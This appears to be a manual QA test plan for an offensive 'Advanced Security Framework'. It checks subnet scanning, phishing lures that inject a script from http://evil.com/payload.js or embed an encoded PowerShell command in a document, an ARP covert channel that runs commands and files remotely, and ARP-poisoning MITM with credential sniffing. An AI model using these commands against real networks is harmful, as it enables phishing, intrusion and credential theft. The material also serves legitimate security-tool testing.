# Comprehensive Test Plan

This document outlines the steps to manually test and verify the functionality of all features within the Advanced Security Framework.

## 1. Shell and Core Commands

-   [ ] **`help`**:
    -   **Action:** Run the `help` command.
    -   **Expected:** The main help menu is displayed correctly, showing all top-level commands.
-   [ ] **`exit`**:
    -   **Action:** Run the `exit` command.
    -   **Expected:** The shell exits gracefully.
-   [ ] **Unknown Command**:
    -   **Action:** Enter a non-existent command (e.g., `foobar`).
    -   **Expected:** An "Unknown command" error is displayed.
-   [ ] **`targets`**:
    -   **Action:** Run `targets` on a fresh startup.
    -   **Expected:** A "No targets found" message is displayed.
    -   **Action:** Run `scan 127.0.0.1/24` (or a relevant subnet), then run `targets`.
    -   **Expected:** The `targets` list shows the newly discovered hosts correctly.
-   [ ] **`scan <subnet>`**:
    -   **Action:** Run `scan` on a known local subnet.
    -   **Expected:** The scan discovers live hosts and adds them to the target list. The output should be a list of IPs, open ports, and threat scores.
-   [ ] **`set` and `info`**:
    -   **Action:** Run `info` with no target selected.
    -   **Expected:** A "No target selected" message is displayed.
    -   **Action:** Run `set <ip>` to select a target.
    -   **Expected:** The shell prompt updates to show the selected target.
    -   **Action:** Run `info`.
    -   **Expected:** The `info` command displays the correct information for the selected target.

## 2. `lure` Command (Social Engineering)

-   [ ] **`lure` (no arguments)**:
    -   **Action:** Run the `lure` command.
    -   **Expected:** The `lure` help menu is displayed.
-   [ ] **`lure web <url> <payload_url>`**:
    -   **Action:** Run `lure web http://example.com http://evil.com/payload.js`.
    -   **Expected:** A `cloned_site/index.html` file is created. The HTML should contain a script tag pointing to the payload URL.
-   [ ] **`lure doc <path> <payload_cmd>`**:
    -   **Action:** Run `lure doc /tmp/report.docx "powershell -e <encoded_command>"`.
    -   **Expected:** A `/tmp/report.docx` file is created.

## 3. `covert` Command (ARP Covert Channel)

-   [ ] **`covert` (no arguments)**:
    -   **Action:** Run the `covert` command.
    -   **Expected:** The `covert` help menu is displayed.
-   [ ] **`covert generate_listener <path>`**:
    -   **Action:** Run `covert generate_listener /tmp/listener.py`.
    -   **Expected:** The `covert_listener.py` script is copied to `/tmp/listener.py`.
-   [ ] **Payload Delivery (requires two separate terminals)**:
    -   **Terminal 1:** Run the generated listener: `python3 /tmp/listener.py`.
    -   **Terminal 2:**
        -   **Action:** Run `covert send_cmd <listener_ip> "echo 'test' > /tmp/covert_test.txt"`.
        -   **Expected (Terminal 1):** The listener logs show the reception and execution of the command. The file `/tmp/covert_test.txt` should be created with the content "test".
        -   **Action:** Create a simple test file (e.g., `echo '#!/bin/bash' > /tmp/test.sh; echo 'touch /tmp/covert_exec_test.txt' >> /tmp/test.sh; chmod +x /tmp/test.sh`). Then, run `covert send_file <listener_ip> /tmp/test.sh`.
        -   **Expected (Terminal 1):** The listener logs show the reception and execution of the file. The file `/tmp/covert_exec_test.txt` should be created.

## 4. `mitm` Command (Man-in-the-Middle)

-   [ ] **`mitm` (no arguments)**:
    -   **Action:** Run the `mitm` command.
    -   **Expected:** The `mitm` help menu is displayed.
-   [ ] **`mitm scan <subnet>`**:
    -   **Action:** Run `mitm scan` on a known local subnet.
    -   **Expected:** The output lists live hosts with their IP and MAC addresses.
-   [ ] **ARP Poisoning and Restoration**:
    -   **Action:** Run `mitm poison <target_ip> <gateway_ip>`.
    -   **Verification (Manual):** On a separate machine on the network, check the ARP table (`arp -a`). The MAC address for the gateway should match the attacker's MAC address.
    -   **Action:** Run `mitm stop`.
    -   **Verification (Manual):** Check the ARP table on the target machine again. The MAC address for the gateway should be restored to its original value.
-   [ ] **Credential Sniffing**:
    -   **Action:** While `mitm poison` is running, generate unencrypted HTTP POST traffic from the target machine containing keywords like "username" or "password".
    -   **Expected:** The main shell on the attacker's machine should print a "Potential credentials found" message along with the captured data.
